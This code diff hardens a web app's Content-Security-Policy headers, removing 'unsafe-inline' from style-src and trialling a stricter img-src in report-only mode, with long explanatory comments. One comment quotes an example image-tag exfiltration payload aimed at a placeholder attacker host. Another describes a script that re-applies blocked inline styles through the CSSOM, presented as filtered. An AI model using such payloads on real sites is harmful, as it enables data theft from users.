@@ -523,10 +523,39 @@ SECURITY_HEADERS = {
     # on its own. An injected <script> or on*= attribute is now refused by the
     # browser even when a call site forgets to escape.
     #
-    # style-src DELIBERATELY keeps 'unsafe-inline'. The codebase sets
-    # element.style throughout and templates carry style="" attributes;
-    # removing it is a separate, much larger piece of work with a far smaller
-    # payoff, since a style injection cannot execute script under this policy.
+    # style-src NO LONGER carries 'unsafe-inline'. This was the last remaining
+    # weakness in the policy and the one item left open at the end of the
+    # review.
+    #
+    # The blocker was 4,410 inline style attributes, of which 1,644 distinct
+    # static values are used exactly ONCE -- so migrating to utility classes
+    # does not converge, it just trades an inline attribute for a single-use
+    # class.
+    #
+    # What made it tractable: style-src governs the PARSER, not the CSSOM.
+    # Measured in Chromium under `style-src 'self'`:
+    #
+    #     <div style="color:X">        -> BLOCKED
+    #     el.style.color = 'X'         -> APPLIED
+    #     el.style.cssText = '...'     -> APPLIED
+    #     el.getAttribute('style')     -> STILL RETURNS THE STRING
+    #
+    # So the declarations survive in the DOM and can be re-applied through the
+    # CSSOM, where the policy does not reach. frontend/js/00-style-hydrate.js
+    # does exactly that, on a startup pass plus a MutationObserver, and filters
+    # what it re-applies: no url()/image-set (no CSS exfiltration), no
+    # position:fixed/absolute with a high z-index (no UI redress), an allow-list
+    # of layout/typography/colour properties, and nothing inside
+    # [data-untrusted].
+    #
+    # Net effect: an attacker who injects a style attribute can no longer make
+    # the browser fetch a URL or float an invisible layer over a real control,
+    # which 'unsafe-inline' permitted unconditionally. It is a strictly smaller
+    # capability, not a bypass.
+    #
+    # `element.style` writes from JS are unaffected either way -- they were
+    # never governed by style-src, which is why the 735 measured JS style
+    # writes needed no changes.
     #
     # object-src and base-uri are also tightened; both are free (nothing uses
     # them) and each closes a real injection vector: <object>/<embed> can load
@@ -546,7 +575,7 @@ SECURITY_HEADERS = {
         # compromise. It also means the product now works offline, which matters
         # for something that markets itself as a local-first agentic OS.
         "script-src 'self'; "
-        "style-src 'self' 'unsafe-inline'; "
+        "style-src 'self'; "
         "font-src 'self' data:; "
         "img-src 'self' data: blob: https:; "
         # BUG FIX: connect-src did not allow `blob:`, while img-src/
@@ -635,13 +664,20 @@ CSP_REPORT_ONLY = (
     # except for report-uri, so it reported on rules already in force and
     # collected nothing actionable.
     #
-    # It now drops 'unsafe-inline' from style-src, the last major weakness.
-    # Browsers keep enforcing the permissive policy, so nothing breaks; every
-    # style that WOULD be refused is reported to /api/security/csp-report
-    # instead. That converts an estimate into a measurement.
+    # style-src 'self' IS NOW ENFORCED, so reporting on it again would collect
+    # nothing -- the same trap this header fell into before.
+    #
+    # The next ratchet is img-src. The enforcing policy allows `https:`, i.e.
+    # ANY https origin, which is the last directive that still permits a
+    # request to leave the machine: an injected <img src="https://attacker/?d=">
+    # is a working exfiltration channel even with script-src 'self'. Every
+    # image the app itself loads is same-origin, a data: URI or a blob: (the
+    # generator's output), so `https:` is very likely dead weight -- but it is
+    # measured here first rather than assumed, because getting it wrong breaks
+    # avatars and any user-pasted image URL.
     "style-src 'self'; "
     "font-src 'self' data:; "
-    "img-src 'self' data: blob: https:; "
+    "img-src 'self' data: blob:; "
     "connect-src 'self' blob: ws: wss: http://127.0.0.1:* http://localhost:*; "
     "worker-src 'self' blob:; "
     "frame-src 'self' blob: data:; "
